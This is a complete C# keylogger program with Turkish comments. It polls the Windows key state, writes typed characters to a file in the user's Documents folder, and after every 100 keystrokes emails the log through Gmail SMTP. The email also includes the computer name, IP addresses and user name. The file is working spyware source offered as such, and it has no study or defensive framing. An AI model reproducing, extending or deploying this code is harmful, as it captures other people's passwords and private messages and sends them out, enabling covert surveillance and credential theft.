using System.Runtime.InteropServices;
using System.Threading;
using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeyStrokes = 0;
        
        // Email ayarları - config.txt dosyasından okunacak
        static string emailAddress = "";
        static string emailPassword = "";

        static void Main(string[] args)
        {
            // Email ayarlarını yükle
            LoadEmailConfig();
            
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String path = Path.Combine(filePath, "keyloggerdata.txt");

            // Dosya yoksa oluştur
            if (!File.Exists(path))
            {
                File.WriteAllText(path, "", Encoding.UTF8);
            }

            Console.WriteLine("KeyLogger başlatıldı. Tuşlara basın (Çıkmak için Ctrl+C)...");
            Console.WriteLine($"Kayıt dosyası: {path}");

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 8; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if ((keyState & 0x8000) != 0)
                    {
                        string textToWrite = "";

                        // Sadece yazdırılabilir karakterleri kaydet
                        if (i >= 48 && i <= 57)  // Sayılar (0-9)
                        {
                            Console.Write((char)i);
                            textToWrite = ((char)i).ToString();
                        }
                        else if (i >= 65 && i <= 90)  // Harfler (A-Z)
                        {
                            Console.Write((char)i);
                            textToWrite = ((char)i).ToString();
                        }
                        else if (i >= 97 && i <= 122)  // Küçük harfler (a-z)
                        {
                            Console.Write((char)i);
                            textToWrite = ((char)i).ToString();
                        }
                        else if (i == 32)  // Space
                        {
                            Console.Write(" ");
                            textToWrite = " ";
                        }
                        else if (i == 13)  // Enter
                        {
                            Console.WriteLine();
                            textToWrite = Environment.NewLine;
                        }
                        else if (i == 8)  // Backspace
                        {
                            Console.Write("[BACKSPACE]");
                            textToWrite = "[BACKSPACE]";
                        }
                        else if (i >= 186 && i <= 222)  // Noktalama işaretleri
                        {
                            // ; = , - . / ` [ \ ] '
                            Console.Write((char)i);
                            textToWrite = ((char)i).ToString();
                        }
                        // Diğer tuşları (F1-F12, Arrow keys, vb.) görmezden gel
                        else
                        {
                            // Hiçbir şey yapma - sayılar ve özel tuşlar gösterilmeyecek
                            Thread.Sleep(100);
                            continue;
                        }

                        // Boş değilse kaydet
                        if (!string.IsNullOrEmpty(textToWrite))
                        {
                            File.AppendAllText(path, textToWrite, Encoding.UTF8);
                            numberOfKeyStrokes++;
                            
                            if (numberOfKeyStrokes >= 100)
                            {
                                SendNewMessage(path);
                                numberOfKeyStrokes = 0; 
                            }
                        }
                        
                        Thread.Sleep(100);
                    }
                }
            }
        }
        static void SendNewMessage(string path)
        {
            try
            {
                // Email ayarları kontrol et
                if (string.IsNullOrEmpty(emailAddress) || string.IsNullOrEmpty(emailPassword))
                {
                    Console.WriteLine("\n[UYARI: Email ayarları yüklenmemiş! config.txt dosyasını düzenleyin.]");
                    Console.WriteLine("[Email örneği: your-email@gmail.com]");
                    Console.WriteLine("[Password: Gmail App Password (16 haneli)]");
                    return;
                }
                
                String logContent = File.ReadAllText(path, Encoding.UTF8);
                
                // Boş içerik kontrolü
                if (string.IsNullOrWhiteSpace(logContent))
                {
                    Console.WriteLine("\n[Log dosyası boş, email gönderilmedi.]");
                    return;
                }
                
                string emailBody = "";
                DateTime now = DateTime.Now;
                string subject = "Keylogger - " + now.ToString("dd/MM/yyyy HH:mm");
                
                var host = Dns.GetHostEntry(Dns.GetHostName());
                emailBody += "=== SİSTEM BİLGİLERİ ===\n";
                emailBody += "Bilgisayar Adı: " + host.HostName + "\n";
                
                foreach (var address in host.AddressList)
                {
                    if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        emailBody += "IP Adresi: " + address.ToString() + "\n";
                    }
                }
                
                emailBody += "Kullanıcı Adı: " + Environment.UserName + "\n";
                emailBody += "Tarih: " + now.ToString("dd/MM/yyyy HH:mm:ss") + "\n\n";
                emailBody += "=== KAYDEDILEN TUŞLAR ===\n";
                emailBody += logContent;

                Console.WriteLine("\n[Email gönderiliyor...]");
                
                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
                {
                    client.EnableSsl = true;
                    client.Timeout = 10000; // 10 saniye timeout
                    client.UseDefaultCredentials = false;
                    client.Credentials = new NetworkCredential(emailAddress, emailPassword);
                    
                    using (MailMessage mailMessage = new MailMessage())
                    {
                        mailMessage.From = new MailAddress(emailAddress);
                        mailMessage.To.Add(emailAddress);
                        mailMessage.Subject = subject;
                        mailMessage.Body = emailBody;
                        mailMessage.IsBodyHtml = false;
                        mailMessage.Priority = MailPriority.Normal;
                        
                        client.Send(mailMessage);
                    }
                }
                
                Console.WriteLine("[✓ Email başarıyla gönderildi!]");
                
                // Log dosyasını temizle (isteğe bağlı)
                // File.WriteAllText(path, "", Encoding.UTF8);
            }
            catch (SmtpException smtpEx)
            {
                Console.WriteLine($"\n[SMTP HATASI: {smtpEx.Message}]");
                Console.WriteLine("[Çözüm: Gmail'de 'Uygulama Şifresi' kullanın]");
                Console.WriteLine("[Link: https://myaccount.google.com/apppasswords]");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[Email hatası: {ex.Message}]");
                if (ex.InnerException != null)
                {
                    Console.WriteLine($"[Detay: {ex.InnerException.Message}]");
                }
            }
        }
        
        static void LoadEmailConfig()
        {
            try
            {
                // Çalıştırılabilir dosyanın bulunduğu dizini al
                string exeDir = AppDomain.CurrentDomain.BaseDirectory;
                string configPath = Path.Combine(exeDir, "config.txt");
                
                // Debug log dosyası
                string debugLog = Path.Combine(exeDir, "debug_log.txt");
                string debugInfo = $"[{DateTime.Now}]\n";
                debugInfo += $"Çalışma dizini: {Directory.GetCurrentDirectory()}\n";
                debugInfo += $"Exe dizini: {exeDir}\n";
                debugInfo += $"Config aranıyor: {configPath}\n";
                debugInfo += $"Dosya var mı: {File.Exists(configPath)}\n\n";
                File.AppendAllText(debugLog, debugInfo, Encoding.UTF8);
                
                Console.WriteLine($"Çalışma dizini: {Directory.GetCurrentDirectory()}");
                Console.WriteLine($"Exe dizini: {exeDir}");
                Console.WriteLine($"Config aranıyor: {configPath}");
                
                if (!File.Exists(configPath))
                {
                    Console.WriteLine("config.txt bulunamadı. Oluşturuluyor...");
                    File.WriteAllText(configPath, "EMAIL=your-email@gmail.com\nPASSWORD=your-app-password-here", Encoding.UTF8);
                    Console.WriteLine($"Config dosyası oluşturuldu: {configPath}");
                    Console.WriteLine("config.txt dosyasına email ve şifrenizi girin!");
                    return;
                }
                
                string[] lines = File.ReadAllLines(configPath, Encoding.UTF8);
                foreach (string line in lines)
                {
                    if (line.StartsWith("EMAIL="))
                    {
                        emailAddress = line.Substring(6).Trim();
                    }
                    else if (line.StartsWith("PASSWORD="))
                    {
                   
                        emailPassword = line.Substring(9).Trim().Replace(" ", "");
                    }
                }
                
                if (!string.IsNullOrEmpty(emailAddress) && !string.IsNullOrEmpty(emailPassword))
                {
                    Console.WriteLine($"Email ayarları yüklendi: {emailAddress}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Config yükleme hatası: {ex.Message}");
            }
        }
    }
}